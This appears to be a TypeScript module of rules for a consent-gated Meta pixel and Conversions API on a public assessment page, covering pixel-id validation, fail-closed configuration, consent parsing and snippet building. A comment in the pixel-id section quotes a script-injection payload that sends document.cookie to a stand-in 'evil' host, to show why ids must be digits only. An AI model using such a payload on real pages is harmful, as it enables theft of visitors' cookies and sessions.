// THE META PIXEL ON A PUBLIC ASSESSMENT PAGE: the rules, and nothing else.
//
// ============================================================================
// WHAT THIS FEATURE IS. A practice running Facebook/Instagram ads at an /assess
// funnel cannot currently tell Meta that anyone converted, so the ad account
// optimises blind. This closes that loop in the two halves Meta itself offers:
// the browser pixel (PageView + a Lead on submission) and the server-side
// Conversions API. The Meta Ads module's campaign builder is the other end of it.
//
// THREE THINGS ARE TRUE OF IT AT ALL TIMES, and they are the reason this is a
// module of rules rather than a snippet pasted into a page:
//
//   1. OFF BY DEFAULT. A practice with no configuration, a practice that has not
//      switched it on, a database where 0083 was never applied, a row somebody
//      hand-edited into nonsense — every one of those collapses to META_PIXEL_OFF
//      and the public page behaves EXACTLY as it does today. There is no path by
//      which a pixel appears because a default drifted.
//
//   2. CONSENT-GATED, PER DEVICE. Configuration is a decision the practice makes;
//      it is not a lawful basis. Under UK GDPR/PECR, dropping Meta's cookies and
//      calling connect.facebook.net requires the visitor's consent, so the config
//      being on is necessary and NOT sufficient: the snippet is injected only
//      after this device's visitor has said yes. A decline is honoured for good,
//      the quiz works identically either way, and — the property that is easiest
//      to lose in a refactor and hardest to notice — WITHOUT CONSENT THE PAGE
//      MAKES NO REQUEST TO ANY FACEBOOK DOMAIN AT ALL. Not a deferred one, not a
//      no-op one. There is nothing in the HTML to make it with.
//
//   3. NO PERSONAL DATA WITHOUT A SECOND, SEPARATE DECISION. The server-side
//      event carries no identifiers by default. Hashed contact details ride along
//      only where the visitor consented on-device AND the practice deliberately
//      switched advanced matching on (meta-capi.ts holds that half).
//
// PURE. No React, no I/O, no browser globals, no server imports: the API route,
// the server component, the browser component, the submit route and the suite all
// read the same rules from here. Everything that touches localStorage or `fbq`
// lives in meta-pixel-consent.ts; everything that touches the network lives in
// meta-capi-send.ts.
// ============================================================================

/* ---------------------------------------------------------------------------
 * 1. The pixel id.
 * ------------------------------------------------------------------------- */

/**
 * A Meta pixel (dataset) id: DIGITS ONLY.
 *
 * THIS GRAMMAR IS THE INJECTION GUARD, in the same way the colour grammar is in
 * custom-theme.ts, and for a sharper reason: this value is interpolated into a
 * <script> body that runs on a public page. A "pixel id" of
 * `1');fetch('https://evil/'+document.cookie);('` is a string that looks like a
 * field and is in fact a program. So the value is never escaped, quoted or
 * cleaned into shape — it either is a run of digits or it is refused, and
 * `metaPixelScript` re-checks that immediately before building the snippet.
 *
 * Meta's own ids are 15-16 digits; the range is deliberately wider than that so a
 * legitimate id from an account we have not seen is never rejected for being the
 * wrong length, while a megabyte of digits still cannot reach a row.
 */
const PIXEL_ID_PATTERN = /^[0-9]{8,20}$/;

/** The longest a pixel id may be. Not the security control — the pattern is. */
export const MAX_PIXEL_ID_LENGTH = 20;

/**
 * The stored form of a pixel id, or null if this is not one.
 *
 * Whitespace is trimmed (the one accommodation to a value pasted out of Events
 * Manager, which often arrives with a trailing space); everything else about the
 * string has to already be an id. Separators are NOT stripped: "123 456" is a
 * typo, and silently turning it into 123456 would point a practice's conversions
 * at somebody else's dataset.
 */
export function normalisePixelId(value: unknown): string | null {
  if (typeof value !== "string") return null;
  const trimmed = value.trim();
  return PIXEL_ID_PATTERN.test(trimmed) ? trimmed : null;
}

/** Is this a pixel id? The predicate behind every gate in this file. */
export function isPixelId(value: unknown): boolean {
  return normalisePixelId(value) !== null;
}

/* ---------------------------------------------------------------------------
 * 2. The configuration.
 * ------------------------------------------------------------------------- */

/** The practice's tracking settings, as stored (migration 0083). */
export interface MetaPixelConfig {
  /** The practice switched it on. False is the answer to every unclear question. */
  enabled: boolean;
  /** A validated pixel id, or null. Never a half-valid string. */
  pixelId: string | null;
  /**
   * May a CONSENTED submitter's hashed email/phone ride along on the server-side
   * event? A separate switch from `enabled`, defaulting off, because it is a
   * separate decision: sending an anonymous conversion and sending an identifier
   * are not the same act and an owner must be able to do the first without the
   * second.
   */
  advancedMatching: boolean;
}

/** The three columns as they arrive from a row (or do not, pre-0083). */
export interface MetaPixelFields {
  enabled?: boolean | null;
  pixelId?: string | null;
  advancedMatching?: boolean | null;
}

/**
 * NO TRACKING AT ALL — what every practice has until an owner switches it on.
 *
 * Frozen because it is handed out by reference below, and a caller mutating it
 * would silently switch tracking on for every unconfigured practice at once.
 * FOLLOW_UP_OFF takes the same posture for the same reason.
 */
export const META_PIXEL_OFF: MetaPixelConfig = Object.freeze({
  enabled: false,
  pixelId: null,
  advancedMatching: false,
});

/**
 * A practice's tracking config, from whatever the row had.
 *
 * THE COLLAPSE IS THE WHOLE DESIGN, and it has three doors into the same room:
 * not enabled, no id, or an id that is not an id — each one returns
 * META_PIXEL_OFF, not "enabled with a null id" or "on but ignored later". So
 * there is no downstream reader anywhere that has to remember a combination.
 * `config.enabled === true` implies `config.pixelId !== null`, by construction,
 * and advancedMatching is meaningless (and false) whenever the feature is off.
 *
 * The id is re-validated on the way OUT and not trusted from the write path, for
 * the reason readbackVars exists in custom-theme.ts: the write path is not the
 * only way a row changes. A hand-edited row, a restored backup or a later
 * migration all reach the renderer without passing the validator again — and this
 * value's next stop is a <script> body.
 */
export function metaPixelConfig(fields: MetaPixelFields | null | undefined): MetaPixelConfig {
  if (!fields || fields.enabled !== true) return META_PIXEL_OFF;
  const pixelId = normalisePixelId(fields.pixelId);
  if (!pixelId) return META_PIXEL_OFF;
  return { enabled: true, pixelId, advancedMatching: fields.advancedMatching === true };
}

/**
 * THE ONLY THING THE BROWSER IS EVER TOLD: a pixel id, or null.
 *
 * A pixel id is public by nature — it is in the page for anyone to read, and Meta
 * treats it as an identifier rather than a secret. Everything ELSE about this
 * configuration is not: `advancedMatching` decides whether a person's hashed
 * contact details leave our server, and the access token that makes the
 * server-side call is never in this object at all (it is read from the
 * environment inside meta-capi-send.ts and has no field here to leak through).
 *
 * So the public projection is one string. This function is the single seam
 * between the configuration and the page, and meta-pixel-wiring.test.ts pins that
 * the pages use it rather than passing a config object down.
 */
export function publicMetaPixelId(config: MetaPixelConfig): string | null {
  return config.enabled ? config.pixelId : null;
}

/* ---------------------------------------------------------------------------
 * 3. The consent decision.
 * ------------------------------------------------------------------------- */

/**
 * What a visitor said. There is no third value and no implicit one: `null` — the
 * absence of a decision — is a state the prompt handles, never a state the pixel
 * is loaded in.
 */
export type MetaConsentDecision = "granted" | "denied";

/**
 * What the PROMPT renders from, which is one value wider than what a visitor can
 * say, and the extra value is the reason there is no flicker.
 *
 *   "unknown"    nobody has looked at this device yet. It is what the SERVER
 *                answers, because a server has no localStorage to consult, and it
 *                is why the banner is not in the server's HTML: a visitor who
 *                declined last week must not be shown it again for a frame while
 *                React catches up.
 *   "undecided"  we looked, and there is no record. THIS is the state the prompt
 *                is for.
 *   granted / denied  they answered.
 *
 * Modelled as a snapshot rather than as component state because the decision
 * lives in an external store (localStorage) and React has a primitive for reading
 * one — `useSyncExternalStore`, whose server snapshot is exactly the "unknown"
 * above. The alternative, a mounted flag set from an effect, is the same
 * behaviour expressed as a cascading render.
 */
export type MetaConsentSnapshot = MetaConsentDecision | "undecided" | "unknown";

/**
 * Where the decision is kept.
 *
 * localStorage, and NOT A COOKIE, deliberately and on both counts:
 *
 *   NOT A COOKIE, because a page that has just asked "may we set cookies?" must
 *   not answer its own question while the visitor is reading it. This page sets
 *   none — the only cookies in play are Meta's own (_fbp), and they exist only
 *   after a grant, because the script that sets them exists only after a grant.
 *
 *   STORED AT ALL, because a refusal that is forgotten on the next page view is
 *   not a refusal, it is a nag. Recording the visitor's own preference so it can
 *   be honoured is the textbook "strictly necessary" case, and it is why writing
 *   it is the ONE storage act this feature performs — after a click, never before.
 *   meta-pixel-consent.ts pins that nothing is written on render.
 */
export const META_CONSENT_STORAGE_KEY = "assess:meta-consent";

/**
 * A stored value as a decision, or null.
 *
 * ANYTHING UNRECOGNISED IS "NOT DECIDED", never "granted": a corrupted key, a
 * value from a future version of this feature, or a string somebody typed into
 * devtools all lead to the prompt being shown again, which is the direction that
 * cannot leak. That is the same fail-closed posture `followUpConfig` takes with a
 * trigger it does not recognise.
 */
export function parseConsentDecision(raw: unknown): MetaConsentDecision | null {
  return raw === "granted" || raw === "denied" ? raw : null;
}

/** May the pixel load on this device? Only ever an explicit yes. */
export function consentGrantsPixel(
  decision: MetaConsentSnapshot | null | undefined,
): boolean {
  return decision === "granted";
}

/**
 * Should the consent prompt be on screen?
 *
 * THREE halves, and the first is the quiet one: "unknown" is not "undecided". A
 * server, and a browser that has not yet read its own storage, both answer
 * "unknown", and neither draws the banner — which is what keeps it out of the
 * server's HTML and off the screen of somebody who declined last week.
 *
 * The other two. NO CONFIG, NO PROMPT: a practice that does not run a pixel
 * must not show its visitors a cookie banner for cookies nobody was going to set
 * — the commonest and most pointless dark pattern on the web, and an outright lie
 * about what the page does. AND NO SECOND ASK: a decision, either way, ends it.
 */
export function shouldAskConsent(
  pixelId: string | null,
  snapshot: MetaConsentSnapshot,
): boolean {
  return Boolean(pixelId) && snapshot === "undecided";
}

/* ---------------------------------------------------------------------------
 * 4. The snippet.
 * ------------------------------------------------------------------------- */

/** Where Meta's pixel library is served from. Named so tests can assert absence. */
export const META_PIXEL_HOST = "connect.facebook.net";

const PIXEL_LIBRARY_URL = `https://${META_PIXEL_HOST}/en_US/fbevents.js`;

/**
 * Meta's base pixel code, initialised for one pixel and firing one PageView.
 *
 * RETURNS null FOR ANYTHING THAT IS NOT AN ID, which is not belt-and-braces for
 * its own sake: this is the last function before a string becomes executable code
 * on a public page, so it re-asks the grammar question rather than trusting that
 * whoever called it did. Every caller therefore has a null to handle, and "we
 * could not build a snippet" can only ever mean "no script tag", never "a script
 * tag containing something else".
 *
 * WHY THE STANDARD BOOTSTRAP IS INLINED RATHER THAN LOADED FROM A PACKAGE. It is
 * Meta's own published loader, byte for byte; it must run before fbevents.js
 * arrives so that queued calls are not lost; and a third-party wrapper would put
 * somebody else's code between a practice's ad account and its patients.
 *
 * NOTE ON THE ABSENT <noscript> PIXEL. Meta's install instructions pair this with
 * an <img> fallback for visitors without JavaScript. We deliberately do not ship
 * one, and it is not an oversight: an <img> in the markup fires the moment the
 * HTML is parsed, with no way to gate it on a click, so the one visitor it serves
 * is the one visitor who could never have consented. A missing measurement is a
 * smaller thing than a request nobody agreed to.
 */
export function metaPixelScript(pixelId: string): string | null {
  const id = normalisePixelId(pixelId);
  if (!id) return null;
  return [
    "!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?",
    "n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;",
    "n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;",
    "t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,",
    `document,'script','${PIXEL_LIBRARY_URL}');`,
    `fbq('init','${id}');`,
    "fbq('track','PageView');",
  ].join("\n");
}

/* ---------------------------------------------------------------------------
 * 5. The write gate, for the owner's settings form.
 * ------------------------------------------------------------------------- */

export type PixelConfigFailure =
  /** Switched on with nothing, or with something that is not an id. */
  | { kind: "pixel-id"; value: string }
  /** Advanced matching asked for on a practice that has not switched tracking on. */
  | { kind: "orphan-matching" };

export type PixelConfigResult =
  | { ok: true; config: MetaPixelConfig }
  | { ok: false; failures: PixelConfigFailure[] };

/**
 * Judge a submitted settings payload. ALL FAILURES AT ONCE, in the
 * flow-validate / validateThemeVars house style.
 *
 * SWITCHING OFF ALWAYS SUCCEEDS, and it is the first branch for a reason: the off
 * path is the one an owner reaches for when something is wrong, and a validator
 * that could refuse it — because the id in the box beside the switch is half-typed
 * — would be a stop button that argues. Off is off; the id is simply not stored.
 *
 * ORPHANED ADVANCED MATCHING IS REFUSED RATHER THAN SILENTLY DROPPED. A form that
 * accepts "share hashed contact details" on a practice with tracking switched off
 * would show a tick that means nothing, and would mean something the day tracking
 * was switched on by somebody else.
 */
export function validatePixelConfig(input: unknown): PixelConfigResult {
  const source =
    input && typeof input === "object" && !Array.isArray(input)
      ? (input as Record<string, unknown>)
      : {};

  const enabled = source.enabled === true;
  const advancedMatching = source.advancedMatching === true;

  if (!enabled) {
    if (advancedMatching) return { ok: false, failures: [{ kind: "orphan-matching" }] };
    return { ok: true, config: META_PIXEL_OFF };
  }

  const pixelId = normalisePixelId(source.pixelId);
  if (!pixelId) {
    const shown = typeof source.pixelId === "string" ? source.pixelId.trim().slice(0, 40) : "";
    return { ok: false, failures: [{ kind: "pixel-id", value: shown }] };
  }

  return { ok: true, config: { enabled: true, pixelId, advancedMatching } };
}

/** One failure as a sentence an owner reads in an API error. */
export function describePixelConfigFailure(failure: PixelConfigFailure): string {
  switch (failure.kind) {
    case "pixel-id":
      return failure.value === ""
        ? "add your Meta pixel ID (the long number in Events Manager) before switching tracking on"
        : `"${failure.value}" is not a Meta pixel ID. It is a number, 8 to ${MAX_PIXEL_ID_LENGTH} digits long, with no spaces`;
    case "orphan-matching":
      return "switch tracking on before sharing hashed contact details, or leave both off";
  }
}

/** Every failure, one per line — the shape describeThemeFailures uses. */
export function describePixelConfigFailures(failures: readonly PixelConfigFailure[]): string {
  return failures.map((f) => `- ${describePixelConfigFailure(f)}`).join("\n");
}
